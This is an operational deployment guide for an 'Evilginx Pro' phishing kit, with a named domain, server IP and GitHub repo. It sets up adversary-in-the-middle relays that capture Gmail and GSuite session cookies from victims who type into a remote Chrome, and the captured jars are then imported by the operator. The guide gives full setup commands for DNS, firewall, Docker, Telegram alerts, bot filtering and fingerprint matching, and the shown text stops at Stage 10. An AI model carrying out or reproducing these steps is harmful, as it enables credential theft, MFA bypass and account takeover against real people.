# 🚀 EVILGINX PRO — COMPLETE DOCKER DEPLOYMENT GUIDE

**Domain:** `gyfdghf.store` · **Server:** `95.133.229.17` · **Repo:** `https://github.com/officialmonsterz/evilginx2.git`

Read once, top to bottom, before typing anything. Every command has an expected result. If a result differs, the table under it says exactly what broke and how to fix it. Paste one block at a time.

**Never paste command output back into the shell.** Output lines have no `#` in front of them, so bash tries to run them as commands and prints `command not found`.

**Go code and YAML are not shell commands.** A block starting `func ` or `healthcheck:` goes **into a file**, not at the prompt. Pasted at the prompt it produces `syntax error near unexpected token` or `command not found`. Every such block in this guide says which file it belongs to and uses a heredoc so the bytes land exactly.

**`<...>` means you replace it.** Everything else is literal — type it exactly as shown.

---

## 🧸 If this is your first time — the short version

A robot Chrome sits in a locked room on the VPS. The victim watches a live video of that robot and types into it. Because the keystrokes land in a real browser on a real Google page, Google is satisfied and mints real cookies. At the end the robot copies its own cookie jar out and you import it.

Building that room takes 35 stages because every wall is proved twice before anyone is let in. That is why the guide is long, and it is why it works.

Three rules:

1. **One block at a time.** Wait for the prompt (`#` or `:`) to come back.
2. **No expected result, no moving on.** Use the table under the block. Every failure mode has a fix.
3. **The typing test at 25f is mandatory.** A field a victim cannot correct is a victim who closes the tab.

**What "finished" looks like:** Stage 34 green, `cookies captured:` numbers in the log, `status done` with a blank error column, seven critical cookies including `__Secure-3PSID`, and the account opening on a fresh private window with no red banner after import. If all of that is true, the deployment is correct.

---

## ⚠️ Read this first

### Seven habits

1. Never paste output back into the shell.
2. Wait for the prompt (`#` or `:`) before pasting the next block.
3. `docker compose up -d` after **any** `.env`, `config.json` or compose edit. Never `restart` for those.
4. No `PORT80_OK`, no phishlet work. No `plain-on-443: 000`, no HTTPS proof.
5. The console always lives in tmux, so a stuck attach can never trap you.
6. After `docker compose up -d chrome`, **poll 9222** — never `sleep`. Chromium needs 15–30 s to bind and a blind sleep loses the race.
7. If a proof returns blank, retry with `-sS` before believing it.

### Never debug with `curl -s`

`-s` swallows error text. A refused port, a dropped handshake and a blacklist ban all render as one blank line, and a blank line looks identical to a dead service. Always `-sS`: quiet about progress, loud about failure.

### `docker ps` has no `RestartCount`

`{{.RestartCount}}` exists only on `docker inspect`. Using it in a `docker ps --format` string gives `can't evaluate field RestartCount`. Restart counts come from:

```bash
docker inspect -f '{{.State.Status}} restarts={{.RestartCount}} oom={{.State.OOMKilled}}' chrome
```

### grep without asterisks

`grep -c 'func (p \*HttpProxy) httpWorker'` returns `0` even when the line exists — in basic regex `*` quantifies the space before it. Every pattern in this guide is asterisk-free except where the backslash is escaped for the shell.

### Two tracks

| Track | How | Use for |
|:--|:--|:--|
| **A — Proxy** | evilginx rewrites and serves the page | consumer sites, first run of any new phishlet |
| **B — Relay** | a real Chrome on the VPS streams to the victim | Gmail, GSuite, M365, Conditional Access, passkeys |

Stages 1–21 shared. Split at 22/23. Rejoin at 26.

Run Track A once even if you only intend relay. It proves DNS, TLS, panels, capture and import before a browser is ever in the loop.

### The two relay phishlets

| | Gmail | GSuite |
|:--|:--|:--|
| phishlet | `relay-gmail` | `relay-gsuite` |
| `phish_sub` | `rl` | `gs` |
| `orig_sub` | `accounts` | `workspace` |
| host | `rl.gyfdghf.store` | `gs.gyfdghf.store` |
| landing | `accounts.google.com` | `workspace.google.com` |
| redirect | `myaccount.google.com` | `admin.google.com` |

Separate host, separate `phish_sub`, separate `orig_sub`, separate script. `validate_gsuite.py` proves all four are distinct on every run.

### How certificates work here

`TLSConfigFromCA` advertises `tlsalpn01.ACMETLS1Protocol`, so ACME is solved on **443 over TLS-ALPN-01**, not HTTP-01. Port 80 is a redirect and fallback only.

A wildcard in `data/crt/wildcard/` short-circuits all of it: `GetCertificate` returns it for the apex and every subdomain. Stage 20 installs it and `config autocert off` in 20g stops per-host ordering. **With autocert off the wildcard is the only certificate source** — if 443 ever fails a handshake, check the wildcard load line first.

### The one-sentence version of the relay

Chrome runs on the VPS behind a guard proxy. The victim's browser shows a video of that Chrome. The script drives it with Google's real selectors. When it reaches the end it copies the cookie jar out. Every bug in this area is either a *blocked call*, *evidence you cannot see*, or *a keystroke that arrives without an identity*. All three are gated in Stage 0.

---

## 📑 Stage index

| Stage | Title |
|:--|:--|
| 0 | **Prove the repo carries every fix** |
| 1 | Reinstall the VPS |
| 2 | Pre-flight |
| 3 | DNS |
| 4 | Free port 53 |
| 5 | Firewall |
| 6 | Docker, jq, tmux, terminal, tmux scroll |
| 7 | Clone, git identity |
| 8 | Tree gate |
| 9 | Go 1.26, build proof |
| 10 | `.env` |
| 11 | Compose proof, both images, start, port-80 gate |
| 12 | Confirm ports, prove 443 is TLS |
| 13 | Blacklist off |
| 14 | Guard proof |
| 15 | Chrome, desktop, **readiness gate** |
| 16 | Control server |
| 17 | Panels |
| 18 | Console, base config |
| 19 | Persistence |
| 20 | **Wildcard, then autocert off** |
| 21 | Collisions, guard rules |
| 22 | TRACK A enable |
| 23 | **TRACK B enable both relays, HTTPS gate** |
| 24 | Capture A |
| 25 | **Capture B — the debugged procedure, incl. the typing test** |
| 26 | Jar build and verify |
| 27 | Import |
| 28 | Pro features |
| 29 | Telegram |
| 30 | GeoIP |
| 31 | Operations |
| 32 | Troubleshooting |
| 33 | What lives where |
| 34 | **Go-live — debug off, timeouts down** |
| 35 | Renewal |

---

## 🧱 STAGE 0 — Prove the repo carries every fix

**Why:** every correction is a commit. This proves the clone has all twenty before you build, and it is read-only.

### 0a — The gate

```bash
rm -rf /tmp/repocheck
git clone https://github.com/officialmonsterz/evilginx2.git /tmp/repocheck
cd /tmp/repocheck
grep -c 'proto.PageNavigate' relay/navigate_safe.go
grep -c 'WaitLoad' relay/navigate_safe.go
grep -c 'Timeout(time.Second).Element' relay/browser.go
grep -c 'func (r \*Runner) name' relay/runner.go
grep -c 'RELAY_DEBUG=' docker-compose.yml
grep -c 'debug: true' phishlets/relay-gmail.yaml
grep -c 'remote-allow-origins' docker/chrome/start.sh
grep -c 'set --' docker/chrome/start.sh
grep -c 'curl' docker/chrome/Dockerfile
grep -c 'port := 80' core/http_proxy.go
grep -c 'secure.Handshake()' core/http_proxy.go
grep -c 'resolveChromeURL' relay/manager.go
grep -c 'function atIdentifier' scripts/relay-gsuite.js
grep -c 'function bouncedBack' scripts/relay-gsuite.js
grep -c 'PROBE_EMAIL_JS' scripts/relay-gsuite.js
grep -c 'func (s \*Session) dispatch' relay/input.go
grep -c 'inputNamedKeys' relay/input.go
grep -c 'WindowsVirtualKeyCode' relay/input.go
grep -c 'kdown' relay/viewer.html
grep -c 'RESULT: PASSED' validate_gsuite.py
cd ~
rm -rf /tmp/repocheck
```

**✅ In order: `1`, `0`, `2`, `2`, `1`, `1`, `1`, `4`, `1`, `1`, `1`, `3`, `1`, `1`, `2`, `1`, `5`, `1`, `1`, `1`.**

All twenty = the repo is correct and Stage 0 passes from now on.

**The two `debug: true` counts read `0` if the go-live change has already been pushed** — Stage 34 sets them to `false`. On the published repo as shipped they read `1`. Every other count is unchanged either way. Check the repository, not the box you are working on: this stage clones to `/tmp` on purpose.

| Count | Line | Meaning |
|:--|:--|:--|
| `1` | `proto.PageNavigate` | navigation no longer waits for lifecycle-idle |
| `0` | `WaitLoad` | the old blocking wait is gone |
| `2` | `Timeout(time.Second).Element` | both `exists` and `wait` are bounded |
| `2` | `func (r \*Runner) name` | short prefix exists (name and nameRaw) |
| `1` | `RELAY_DEBUG=` | debug reaches the container |
| `1` | `debug: true` | gmail phishlet starts in testing mode |
| `1` | `remote-allow-origins` | DevTools origin allowed |
| `4` | `set --` | user-agent can no longer be split into junk tabs |
| `1` | `curl` in the chrome Dockerfile | healthcheck probe has a tool to run |
| `1` | `port := 80` | port hard-coded, config cannot hijack it |
| `1` | `secure.Handshake()` | handshake before the relay branch |
| `3` | `resolveChromeURL` | comment, definition, call site |
| `1` | `function atIdentifier` | gsuite email selector is host-gated |
| `1` | `function bouncedBack` | gsuite detects a dropped continue |
| `2` | `PROBE_EMAIL_JS` | six-selector probe, not one brittle selector |
| `1` | `func (s \*Session) dispatch` | the dispatch method the caller expects exists |
| `5` | `inputNamedKeys` | control keys carry real identities |
| `1` | `WindowsVirtualKeyCode` | virtual key codes are set, so Backspace works |
| `1` | `kdown` | the viewer sends held modifiers as separate events |
| `1` | `RESULT: PASSED` | the gsuite validator ships in the repo |

**❌ Any deviation → `git pull` in `~/evilginx2` at Stage 7 and redo this stage.**

Note the capital `R` in `*Runner` and `S` in `*Session` — both receivers are exported, so lowercase patterns return `0` on a good file.

### 0b — Reference: pushing a change

`git status --short` to see what is dirty, `gofmt -l` and `go build ./...` to prove it compiles, `git add` the named files, `git commit`, `git push origin master`, then `git show origin/master:<file> | grep -c <pattern>` to prove the remote took it. A local commit alone proves nothing.

**❌ `Author identity unknown`** → set `user.name` and `user.email` first.
**❌ `Authentication failed`** → the PAT is missing or expired.

### 0c — Reference: the things that are not in git

Only if upgrading an existing box:

```bash
cd ~/evilginx2
grep -E '^(TG_BOT_TOKEN|TG_CHAT_ID|WEBAPI_PASS|DASHBOARD_PASS|TZ)=' .env
```

**✅ Five lines.** Into the password manager.

---

## 🖥️ STAGE 1 — Reinstall the VPS

Only after 0a is fully green.

1. Provider panel → your server → **Reinstall** / **Rebuild**.
2. **Ubuntu 22.04 LTS**, 64-bit.
3. New root password, saved.
4. Wait for the panel to report complete.
5. Clear the stale host key:

```
ssh-keygen -R 95.133.229.17
```

Reconnect:

```
ssh root@95.133.229.17
```

**✅ A fresh `#` prompt and a welcome banner.**

**❌ `Host key verification failed`** → you skipped `ssh-keygen -R`.
**❌ `Connection refused` for a few minutes** → still rebuilding; wait.

---

## 🧭 STAGE 2 — Pre-flight

| Item | Notes |
|:--|:--|
| VPS `95.133.229.17` | Ubuntu 22.04, fresh |
| Root SSH | every stage assumes root |
| DNS control | and the ability to add **TXT** records at Stage 20 |
| Push rights to the repo | PAT with `repo` scope |
| Throwaway Google account | credentials to hand |
| Cookie-Editor | Chrome, Edge, Brave, Firefox |
| 80–95 minutes | DNS and the wildcard are the slow parts |

**Public:** 22/tcp, 53/udp, 53/tcp, 80/tcp, 443/tcp, 5000/tcp, 8082/tcp
**Loopback only, never open:** 18555 guard, 18556 control, 9222 DevTools, 6080 VNC

### Memory — read before you start

One relay session is one full Chromium at roughly 250–400 MB. This box reports **1962 MB total**:

| Situation | What to expect |
|:--|:--|
| One session at a time | comfortable, ~980 MB free between runs |
| Two at once | tight, frames stutter |
| Three or more | swap thrash, sessions reaped mid-flow |

Two phishlets is still one session at a time. Run `free -m` before each capture and restart Chrome first. Resize to 4 GB for real traffic.

**Six hard rules:** never `systemctl stop systemd-resolved`; `up -d` after any edit; send lure URLs never bare hostnames; no two phishlets share a `phish_sub` (the relays own `rl` and `gs`); `proxy` and `script` are console-only; 9222 and 6080 stay on loopback.

**✅ Read Stages 12, 13, 20, 23, 25 and 32 twice.**

---

## 🌐 STAGE 3 — DNS

**Why `rl` and `gs` explicitly:** the `*` record covers them, but explicit records remove a whole class of "why is this host blank" bugs — and both are hosts you curl.

Registrar → Domain List → `gyfdghf.store` → Advanced DNS:

1. Delete every parking or default record, including any `162.255.x.x`.
2. Add exactly four, DNS-only, TTL 1 minute:

| Type | Host | Value |
|:--|:--|:--|
| A | `@` | `95.133.229.17` |
| A | `*` | `95.133.229.17` |
| A | `rl` | `95.133.229.17` |
| A | `gs` | `95.133.229.17` |

On Cloudflare all four must be **grey cloud**. Orange cloud terminates TLS at Cloudflare and breaks the relay.

```bash
apt update && apt install -y dnsutils
dig +short gyfdghf.store
dig +short zzz913.gyfdghf.store
dig +short rl.gyfdghf.store
dig +short gs.gyfdghf.store
```

**✅ Four lines, each `95.133.229.17`.**

**❌ `162.255.x.x`** → parking record, delete. **❌ Nothing** → wait five minutes. **❌ Apex only** → `*` missing. **❌ Cloudflare ranges** → not grey. **❌ `gs` empty** → add it; the gsuite host will be blank without it.

---

## 🔌 STAGE 4 — Free port 53

```bash
sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved
sleep 3
ping -c 3 github.com
ss -lntup | grep ':53 '
```

**✅ ping replies, `ss` prints nothing.**

**❌ `Could not resolve host`** → `systemctl start systemd-resolved`, redo.
**❌ Still on `:53`** → `grep DNSStubListener /etc/systemd/resolved.conf` must read `no`.
**❌ Ping fails silently** → `cat /etc/resolv.conf` must show `nameserver 1.1.1.1`.

**⚠️ Never `systemctl stop systemd-resolved`.**

---

## 🛡️ STAGE 5 — Firewall

```bash
apt install -y ufw
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 53/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp
ufw allow 8082/tcp
ufw enable
ufw status numbered
```

**✅ `Status: active`, seven rules.**

**❌ `ufw: not found`** → the apt line did not run. **❌ Locked out** → provider console, then `ufw allow 22/tcp`.

Mirror the seven in the provider panel.

---

## 🐳 STAGE 6 — Docker, jq, tmux, terminal, tmux scroll

```bash
curl -fsSL https://get.docker.com | sh
apt update && apt install -y jq tmux git python3-yaml openssl
grep -q 'stty -ixon' ~/.bashrc || echo '[ -t 0 ] && stty -ixon' >> ~/.bashrc
stty -ixon
docker --version
docker compose version
stty -a | grep -o -- '-ixon'
```

**✅ Two version strings, then `-ixon`. Takes 2–4 minutes.**

`python3-yaml` is installed here, not later, because `validate_gsuite.py` at Stage 8k parses YAML and would fail without it. `openssl` is needed at 20e to prove the certificate SAN.

**❌ `command not found`** → rerun the curl. **❌ `permission denied`** → `usermod -aG docker $USER && newgrp docker`. **❌ No `-ixon`** → redo the pair.

### 6a — Make tmux scrollable, permanently

Without this the wheel does nothing and you cannot scroll up to copy output.

```bash
grep -q 'set -g mouse on' ~/.tmux.conf 2>/dev/null || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf 2>/dev/null
tail -1 ~/.tmux.conf
```

**✅ `set -g mouse on`.**

Now the wheel scrolls, and dragging selects text into tmux's buffer. Paste the buffer with `Ctrl-b` then `]`.

### 6b — Leaving tmux and coming back safely

List the session name first:

```bash
tmux ls
```

Leave without killing anything:

```
Ctrl-b   then   d
```

You are on a normal prompt with full scrollback and clean copy. Return with:

```bash
tmux attach -t log
```

**❌ `sessions should be nested with care`** → you are already inside a session. Detach first with `Ctrl-b d`. To create one in the background without nesting:

```bash
tmux new -d -s work
tmux switch-client -t work
```

---

## 📥 STAGE 7 — Clone, git identity

```bash
cd ~
git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2
chmod +x entrypoint.sh telegram-watch.sh docker/chrome/start.sh validate_gsuite.py 2>/dev/null
git remote -v
```

**✅ Folder created, remote shows your repo twice.**

**❌ A `Username for 'https://github.com':` prompt** → the repo is private or renamed. Enter your GitHub username, then paste the PAT as the password. **❌ `Repository not found`** → same cause; the PAT must be used, or the repo made public.

```bash
git config --global user.name "officialmonsterz"
git config --global user.email "officialmonsterz@users.noreply.github.com"
git config --global credential.helper store
git config --global init.defaultBranch master
git config user.name; git config user.email
```

**✅ The name, then the email.**

Token once: `https://github.com/settings/tokens` → classic → `evilginx-vps` → 90 days → `repo` → Generate → into the manager.

**❌ `Could not resolve host`** → Stage 4 broke DNS.

---

## 🔍 STAGE 8 — Tree gate

### 8a — Remove the two superseded files

```bash
cd ~/evilginx2
rm -f core/relay_bridge.go core/relay_phishlet.go
```

`relay_bridge.go` was folded into `relay_proxy.go`. `relay_phishlet.go` duplicates `RelayConfig`, `IsRelay` and `defaultRelayConfig`. Leaving either in place produces `redeclared` errors at Stage 9.

### 8b — Dockerfile

```bash
cd ~/evilginx2
grep -n 'golang:1.26-alpine\|GOFLAGS=-mod=vendor\|go mod tidy' Dockerfile
```

**✅ One hit on `1.26-alpine`, one on `GOFLAGS=-mod=vendor`, none on `go mod tidy`.**

### 8c — `.dockerignore` must not hide vendor

```bash
cd ~/evilginx2
grep -c '^vendor/$' .dockerignore
grep -x 'vendor' .dockerignore || echo "vendor NOT ignored"
grep -x 'data' .dockerignore
grep -x '.env' .dockerignore
```

**✅ `0`, `vendor NOT ignored`, then `data` and `.env`.**

**❌ `1`** → `sed -i '\|^vendor/$|d' .dockerignore`.

### 8d — Compose shape

```bash
cd ~/evilginx2
grep -n 'tty: true\|stdin_open: true' docker-compose.yml
grep -c 'CHROME_PROXY=' docker-compose.yml
grep -c 'RELAY_DEBUG=' docker-compose.yml
grep -n 'network_mode: host' docker-compose.yml
grep -c '^    ports:' docker-compose.yml
```

**✅ One `tty`, one `stdin_open`, `2`, `1`, two `network_mode: host`, `0`.**

| Wrong | Meaning | Fix |
|:--|:--|:--|
| no `tty`/`stdin_open` | detach impossible | add both under `container_name: evilginx2` |
| `CHROME_PROXY` not `2` | a service lost the variable | add it to **both** env lists |
| `RELAY_DEBUG` not `1` | debug never reaches the container | add `- RELAY_DEBUG=${RELAY_DEBUG:-false}` to the **evilginx2** env list |
| `ports` not `0` | port publishing on a host-network stack | remove the `ports:` blocks |

### 8e — Chrome healthcheck in compose

**Why:** a healthcheck lets `docker compose up -d --wait chrome` block until 9222 answers, so no start-up race exists at all. It needs `curl` in the image, which 8f verifies. **The block already ships in the repo** — verify, do not add.

```bash
cd ~/evilginx2
grep -n 'healthcheck:' -A 6 docker-compose.yml
docker compose config >/dev/null && echo COMPOSE_OK
```

**✅ The block at four spaces under `chrome:`, then `COMPOSE_OK`.**

**❌ `did not find expected key`** → the block is at the wrong indent; it must sit at four spaces under the service name.

### 8f — Chrome Dockerfile carries curl

```bash
cd ~/evilginx2
grep -n 'apt-get -y install' -A 2 docker/chrome/Dockerfile
```

**✅ The install list contains `curl`.** If it does not, edit the line so it reads:

```
RUN apt-get update && apt-get -y install --no-install-recommends \
      chromium xvfb x11vnc openbox novnc websockify \
      curl ca-certificates fonts-liberation fonts-noto
```

**❌ Missing `curl`** → the healthcheck returns unhealthy forever.

### 8g — Relay files, single declarations

```bash
cd ~/evilginx2
ls relay/config.go relay/embed.go relay/prelude.js relay/viewer.html relay/emitter.go \
   relay/stream.go relay/serve.go relay/navigate_safe.go relay/mouse.go relay/headers.go \
   relay/browser.go relay/runner.go relay/manager.go relay/input.go relay/glob.go relay/headerrules.go \
   core/relay_rules.go core/relay_guard.go core/relay_lurecode.go core/relay_tmpl.go \
   core/relay_scripts.go core/relay_proxy.go core/relay_api.go \
   scripts/relay-gmail.js phishlets/relay-gmail.yaml \
   scripts/relay-gsuite.js phishlets/relay-gsuite.yaml validate_gsuite.py \
   docker/chrome/Dockerfile docker/chrome/start.sh
grep -rn "func (p \*HttpProxy) startRelay" core/
grep -rn "type RelayConfig struct" core/
grep -rn "func (p \*Phishlet) IsRelay" core/
```

**✅ Every path listed, one hit each, all in `relay_proxy.go` or `phishlet.go`.**

### 8h — Wiring and import cycle

```bash
cd ~/evilginx2
grep -c "api/relay" core/webapi.go
grep -n "serveRelayConn" core/http_proxy.go
grep -rn "kgretzky/evilginx2/core" relay/
ls phishlets/
```

**✅ `3`, one hit, nothing from the import grep, only real phishlets.**

### 8i — The code fixes, in this clone

```bash
cd ~/evilginx2
grep -c 'proto.PageNavigate' relay/navigate_safe.go
grep -c 'WaitLoad' relay/navigate_safe.go
grep -c 'Timeout(time.Second).Element' relay/browser.go
grep -c 'func (r \*Runner) name' relay/runner.go
grep -c 'debug: true' phishlets/relay-gmail.yaml
grep -c 'func (s \*Session) dispatch' relay/input.go
grep -c 'WindowsVirtualKeyCode' relay/input.go
grep -c 'set --' docker/chrome/start.sh
```

**✅ `1`, `0`, `2`, `2`, `1`, `1`, `1`, `4`.**

**❌ Any deviation** → `git pull`; the clone is stale.

### 8j — The dispatch contract

**Why:** `serve.go` forwards every viewer message to `sess.Input(...)`, which calls `s.dispatch(...)`. If `input.go` is replaced by a version without that method, the build fails with `s.dispatch undefined`.

```bash
cd ~/evilginx2
grep -n 'func (s \*Session) Input' -A 8 relay/manager.go
grep -n 'sess.Input' relay/serve.go
```

**✅ The first shows `s.dispatch(page, kind, x, y, button, dy, text)`, the second shows the `sess.Input` call.**

**❌ `undefined (type *Session has no field or method dispatch)` at Stage 9** → the `dispatch` method was dropped from `input.go`. Restore the file from `git show HEAD:relay/input.go`.

### 8k — Validate the gsuite phishlet before anything else

```bash
cd ~/evilginx2
python3 validate_gsuite.py
```

**✅**

```
phish_sub     : gs (no collision with rl)
phish host    : gs.google.com
login domain  : workspace.google.com
redirect      : https://admin.google.com
bindings      : 12, all known

RESULT: PASSED
```

**❌ `ModuleNotFoundError: yaml`** → Stage 6 skipped the `python3-yaml` package; `apt install -y python3-yaml` and rerun.
**❌ `unbalanced`** → an apostrophe crept into a comment and was read as a string opener.
**❌ `unknown page binding`** → a typo in a `page.` call; the message names it.
**❌ `collides with relay-gmail`** → a value was reused.
**❌ `YAML parse error`** → a line lost indentation.
**❌ `bindings` under `12`** → a selector call was deleted; `git show HEAD:scripts/relay-gsuite.js > scripts/relay-gsuite.js`.

Do not continue without `RESULT: PASSED`.

### 8l — Stale phishlets

```bash
cd ~/evilginx2
git rm -f phishlets/1.yaml phishlets/o365.yaml 2>/dev/null
ls phishlets/
```

**✅ Only real phishlets.**

---

## 🔨 STAGE 9 — Go 1.26, build proof

### 9a — Download, verify, install (one block, do not split it)

```bash
cd /tmp
rm -f go1.26.11.linux-amd64.tar.gz
curl -fsSLO "https://go.dev/dl/go1.26.11.linux-amd64.tar.gz"
ls -l go1.26.11.linux-amd64.tar.gz
gzip -t go1.26.11.linux-amd64.tar.gz && echo GZ_OK
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.26.11.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
grep -q '/usr/local/go/bin' ~/.bashrc || echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
go version
which go
```

**✅ About 67,000,000 bytes, `GZ_OK`, `go version go1.26.11 linux/amd64`, `/usr/local/go/bin/go`.**

**❌ Under ~60 MB or no `GZ_OK`** → delete the tarball, re-curl. **❌ `404`** → take the current filename from `https://go.dev/dl/`.
**❌ `tar: ... No such file`** → the download failed; the extraction has nothing to unpack.
**❌ `go version` not found but `/usr/local/go/bin/go` exists** → `export PATH=$PATH:/usr/local/go/bin` again in this shell. If the tarball was verified but extraction was skipped, run `tar -C /usr/local -xzf go1.26.11.linux-amd64.tar.gz` on its own.

### 🚦 Gate — no `go version` output, no build

```bash
go version | grep -q 'go1.26.11' && echo GO_OK
```

**✅ `GO_OK`**

**❌ Nothing** → 9a did not complete. Do not run 9b.

### 9b — Build and vet

```bash
cd ~/evilginx2
gofmt -l $(git ls-files '*.go' | grep -v '^vendor/')
go build ./...
go vet ./...
go build -trimpath -o /tmp/evilginx . && ls -l /tmp/evilginx
```

**✅ All four silent, then a binary near 38 MB.**

**❌ Compiler error → file map:**

| Compiler says | You kept |
|:--|:--|
| `RelayConfig redeclared` | `core/relay_phishlet.go` |
| `method redeclared` on `startRelay` | `core/relay_bridge.go` |
| `s.dispatch undefined` | `relay/input.go` lost the `dispatch` method — `git show HEAD:relay/input.go` |
| `inputKey redeclared` | two copies of the keyboard table in `input.go` |
| `undefined: relay.Handler` | missing `relay/serve.go` — `git pull` |
| `unknown field Script` | old `relay/config.go` |
| `undefined: resolveChromeURL` | old `relay/manager.go` — `git pull` |
| `undefined: io` | manager import lost — `git checkout -- relay/manager.go && git pull` |
| `import cycle` | something under `relay/` imports `core` |
| `HTTPChallengeHandler undefined` | old `http_proxy.go` — `git pull` |
| `declared and not used` | open the line, remove the identifier |

**Do not continue until all four are silent.**

```bash
cd ~/evilginx2
git tag pre-build-$(date +%s)
```

---

## ⚙️ STAGE 10 — `.env`

```bash
cd ~/evilginx2
nano .env
```

Paste the block, then replace only the two Telegram markers. `RELAY_DEBUG=true` and `RELAY_MAX_SECONDS=1800` are testing values; Stage 34 changes them.

Both user-agent strings must say **Chrome/156** — the engine in the image is 156, and a 131 string against a 156 engine is a fingerprint tell.

```env
# ============================================================
# TIMEZONE + TELEGRAM
# ============================================================
TZ=America/New_York
TG_BOT_TOKEN=<PASTE_BOT_TOKEN_HERE>
TG_CHAT_ID=<PASTE_CHAT_ID_HERE>

# ============================================================
# DOMAIN + IP
# ============================================================
BASE_DOMAIN=gyfdghf.store
EXTERNAL_IP=95.133.229.17

# ============================================================
# SIMPLE DASHBOARD (port 5000)
# ============================================================
DASHBOARD_ADDR=0.0.0.0:5000
DASHBOARD_USER=admin
DASHBOARD_PASS=Monsterz-Dash-5000-Q9m4
DASHBOARD_ENABLED=true

# ============================================================
# FULL WEB ADMIN PANEL (port 8082)
# ============================================================
WEBAPI_PORT=8082
WEBAPI_USER=admin
WEBAPI_PASS=Monsterz-Admin-8082-X7k2

# ============================================================
# RELAY — guard, control, chrome
# ============================================================
RELAY_ENABLED=true
RELAY_GUARD_ADDR=127.0.0.1:18555
RELAY_CONTROL_ADDR=127.0.0.1:18556
CHROME_URL=http://127.0.0.1:9222
CHROME_PROXY=http://127.0.0.1:18555
CHROME_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
RELAY_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
RELAY_UPSTREAM_PROXY=
SCRIPTS_DIR=/app/scripts
RELAY_OUTPUT_DIR=/home/evilginx/.evilginx/relay
RELAY_RULES_FILE=/home/evilginx/.evilginx/allowdeny.txt
RELAY_COUNTRY_FILE=/home/evilginx/.evilginx/country.csv
RELAY_IDLE_SECONDS=300
RELAY_MAX_SECONDS=1800
RELAY_WIDTH=1366
RELAY_HEIGHT=768
RELAY_QUALITY=70
RELAY_MAXFPS=12
RELAY_LANG=en-US
RELAY_TIMEZONE=
RELAY_DEBUG=true

# ============================================================
# OPERATIONS
# ============================================================
BOT_FILTER=false
VISITOR_ALERTS=true
SESSION_RETENTION_DAYS=0
SESSION_MEMORY_HOURS=2
BACKUP_ENABLED=true
BACKUP_INTERVAL_HOURS=6
BACKUP_KEEP=10

# ============================================================
# COOKIE CAPTURE + EXPORT
# ============================================================
CAPTURE_ALL_COOKIES=true
COOKIE_EXPORT_DEFAULT_DAYS=30
AUTO_EXPORT=true
AUTO_EXPORT_PATH=/home/evilginx/.evilginx/exports
AUTO_EXPORT_FORMAT=json
AUTO_EXPORT_PER_FILE=true

# ============================================================
# PRO FEATURES
# ============================================================
DOM_INJECTION=true
REWRITE_URLS=false
CSS_RANDOMIZATION=false
```

`BOT_FILTER=false` for the build — Stage 34 flips it. `REWRITE_URLS=false` on purpose — Stage 28b.

**Relay variable meanings:**

| Variable | Plain English |
|:--|:--|
| `RELAY_ENABLED` | master switch |
| `CHROME_URL` | Chrome DevTools. Loopback only |
| `CHROME_PROXY` | what the guard makes Chrome use. This is the cage |
| `RELAY_GUARD_ADDR` | where the guard listens |
| `RELAY_CONTROL_ADDR` | health, sessions, kill, frame |
| `RELAY_UPSTREAM_PROXY` | optional second hop. Blank = direct exit |
| `RELAY_RULES_FILE` | the allow/deny list |
| `RELAY_COUNTRY_FILE` | the CIDR→country table |
| `RELAY_OUTPUT_DIR` | where captures land. **Must stay on the volume** |
| `SCRIPTS_DIR` | where relay scripts live |
| `RELAY_IDLE_SECONDS` | kill a session nobody is watching |
| `RELAY_MAX_SECONDS` | hard wall-clock cap per session |
| `RELAY_WIDTH` / `RELAY_HEIGHT` | default viewport; a phishlet can override |
| `RELAY_QUALITY` | default JPEG quality |
| `RELAY_MAXFPS` | default frame cap |
| `RELAY_LANG` | default `Accept-Language` |
| `RELAY_TIMEZONE` | default browser timezone; blank = match the server |
| `RELAY_DEBUG` | log every status line. **On while testing, off at go-live** |

No quotes. Letters, digits, `-` `!` `%` `@` `?` only. Linux line endings. Save `Ctrl+O`, `Enter`, `Ctrl+X`.

```bash
cd ~/evilginx2
sed -i 's/\r$//' .env
cat -A .env | grep -E 'WEBAPI_PASS|RELAY_ENABLED|CHROME_PROXY|EXTERNAL_IP|RELAY_DEBUG|RELAY_MAX_SECONDS|BOT_FILTER|USER_AGENT'
TG=$(grep '^TG_BOT_TOKEN=' .env | cut -d= -f2-)
curl -sS "https://api.telegram.org/bot$TG/getMe" | grep -o '"ok":[a-z]*'
```

**✅ Nine lines ending `$` with no `^M` and no `<`, both user-agent lines ending `Chrome/156.0.0.0 Safari/537.36`, `RELAY_ENABLED=true`, `CHROME_PROXY` filled, `EXTERNAL_IP=95.133.229.17`, `RELAY_DEBUG=true`, `RELAY_MAX_SECONDS=1800`, `BOT_FILTER=false`, then `"ok":true`.**

**❌ `^M$`** → rerun the sed. **❌ Brackets** → remove them. **❌ Empty `CHROME_PROXY`** → truncated paste. **❌ `Chrome/131`** → the string was copied from an older guide; the engine is 156. **❌ `404`** → dead token. **❌ Fewer than nine lines** → a key was dropped in the paste; redo the whole block.

Message the bot from your phone, then:

```bash
TG=$(grep '^TG_BOT_TOKEN=' .env | cut -d= -f2-)
CHAT=$(curl -sS "https://api.telegram.org/bot$TG/getUpdates" | grep -o '"chat":{"id":[-0-9]*' | head -1 | grep -o '[-0-9]*$')
echo "chat=$CHAT"
sed -i "s|^TG_CHAT_ID=.*|TG_CHAT_ID=$CHAT|" .env
curl -sS "https://api.telegram.org/bot$TG/sendMessage" -d chat_id="$CHAT" -d text="relay online" | grep -o '"ok":[a-z]*'
```

**✅ Numeric `chat=`, `"ok":true`, and a message on your phone.**

**❌ Empty `chat=`** → you never pressed Start on the right bot.

```bash
